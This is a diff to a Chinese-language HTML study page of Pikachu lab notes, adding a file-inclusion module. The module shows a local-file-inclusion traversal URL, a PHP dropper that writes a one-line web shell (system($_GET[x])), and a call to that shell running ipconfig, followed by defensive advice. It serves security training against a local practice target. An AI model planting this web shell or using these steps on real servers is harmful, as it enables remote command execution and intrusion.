@@ -419,6 +419,13 @@ set_token();   // 第48行：校验“之后”才生成/刷新 token</code></pr
     </details>
 
     <details class="module">
+      <summary><span>SQL 注入模块</span><span class="badge">开发中</span></summary>
+      <div class="module-body">
+        <p class="module-desc">该模块正在整理中，敬请期待。</p>
+      </div>
+    </details>
+
+    <details class="module">
       <summary><span>RCE 模块</span><span class="badge">2 题 + 防护</span></summary>
       <div class="module-body">
         <p class="module-desc">RCE（Remote Code Execution，远程代码执行 / 命令执行）是指应用把不可信的输入拼接进系统命令或代码中执行，攻击者可借此在服务器上执行任意命令或代码，危害极高。Pikachu 的 RCE 模块包含 exec "ping"（命令注入）和 exec "eval"（代码执行）。</p>
@@ -453,6 +460,65 @@ set_token();   // 第48行：校验“之后”才生成/刷新 token</code></pr
               <li><strong>禁用危险函数：</strong>在 <code>disable_functions</code> 中禁用 <code>system</code>、<code>exec</code>、<code>passthru</code>、<code>shell_exec</code>、<code>popen</code> 等（<code>eval</code> 需靠代码审计 / 安全扩展约束）。</li>
               <li><strong>最小权限：</strong>Web 服务以低权限账号运行，降低被控后的影响范围。</li>
               <li><strong>用安全 API 替代：</strong>尽量使用语言/框架提供的安全接口，而不是 shell 或 eval。</li>
+            </ul>
+          </div>
+        </details>
+      </div>
+    </details>
+
+    <details class="module">
+      <summary><span>文件包含模块</span><span class="badge">3 题 + 防护</span></summary>
+      <div class="module-body">
+        <p class="module-desc">文件包含（File Inclusion）是指应用通过 <code>include</code> / <code>require</code> 等语句加载文件时，文件名由用户可控参数决定且未做严格校验，从而可以包含任意文件（本地文件包含 LFI / 远程文件包含 RFI）。结合上传或写文件，常可进一步 Getshell。</p>
+
+        <details class="topic">
+          <summary><span>1. 本地文件包含（LFI）</span></summary>
+          <div class="topic-body">
+            <p><strong>原理：</strong>类似 <code>include($_GET['filename'])</code> 的写法让用户控制被包含的文件路径，配合 <code>../</code> 目录穿越即可跳出当前目录，包含服务器上的其它文件。</p>
+            <p><strong>测试：</strong>用 <code>../</code> 回到上一级目录，包含 <code>fileinclude.php</code>：</p>
+            <div class="code"><pre><code>http://127.0.0.1:8443/pikachu/vul/fileinclude/fi_local.php?filename=../fileinclude.php&amp;submit=提交</code></pre></div>
+            <img src="../drafts/pikachu/文件包含模块截图/PicSnapX20261028172747682.png" alt="本地文件包含 目录穿越" loading="lazy">
+            <div class="note">配合日志、上传文件等，可能进一步读取源码或执行代码。</div>
+          </div>
+        </details>
+
+        <details class="topic">
+          <summary><span>2. 包含写一句话木马（Getshell）</span></summary>
+          <div class="topic-body">
+            <p><strong>原理：</strong>被包含的文件若含有 PHP 代码会被执行。利用一个会写文件的脚本 <code>yijuhua.txt</code>，包含后会在同目录生成 <code>yijuhua.php</code>，内容为 <code>&lt;?php system($_GET[x]);?&gt;</code>（一句话木马）。</p>
+            <p><code>yijuhua.txt</code> 内容：</p>
+            <div class="code"><pre><code>&lt;?php
+$myfile = fopen("yijuhua.php", "w");
+$txt = '&lt;?php system($_GET[x]);?&gt;';
+fwrite($myfile, $txt);
+fclose($myfile);
+?&gt;</code></pre></div>
+            <p>包含之后，目录里出现新生成的 <code>yijuhua.php</code>：</p>
+            <img src="../drafts/pikachu/文件包含模块截图/PicSnapX20261028172154036.png" alt="yijuhua.txt 源码" loading="lazy">
+            <img src="../drafts/pikachu/文件包含模块截图/InkedPicSnapX20261028172326264.jpg" alt="生成的 yijuhua.php" loading="lazy">
+            <div class="note">这就是“一句话木马”，通过参数 <code>x</code> 传入系统命令。</div>
+          </div>
+        </details>
+
+        <details class="topic">
+          <summary><span>3. 命令执行</span></summary>
+          <div class="topic-body">
+            <p><strong>利用：</strong>直接访问木马并传入 <code>x</code> 参数，即可执行系统命令（这里执行 <code>ipconfig</code>）：</p>
+            <div class="code"><pre><code>http://127.0.0.1:8443/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig</code></pre></div>
+            <img src="../drafts/pikachu/文件包含模块截图/PicSnapX20261028173146069.png" alt="木马执行 ipconfig" loading="lazy">
+            <div class="note">代码里写作 <code>$_GET[x]</code>（未加引号）会产生 Warning，但命令依然执行成功。</div>
+          </div>
+        </details>
+
+        <details class="topic">
+          <summary><span>防护方法</span><span class="badge">防御建议</span></summary>
+          <div class="topic-body">
+            <ul>
+              <li><strong>白名单包含：</strong>只允许包含指定的文件名，不要把用户输入直接拼接进路径。</li>
+              <li><strong>过滤穿越字符：</strong>拦截 <code>../</code>、<code>..\\</code>、绝对路径等，或先用 <code>basename()</code> 只取文件名。</li>
+              <li><strong>关闭远程包含：</strong>设置 <code>allow_url_include=Off</code>，必要时也关闭 <code>allow_url_fopen</code>。</li>
+              <li><strong>上传目录禁止执行：</strong>限制上传目录的 PHP 执行权限。</li>
+              <li><strong>最小权限：</strong>Web 服务以低权限账号运行，降低被 Getshell 后的影响。</li>
             </ul>
           </div>
         </details>
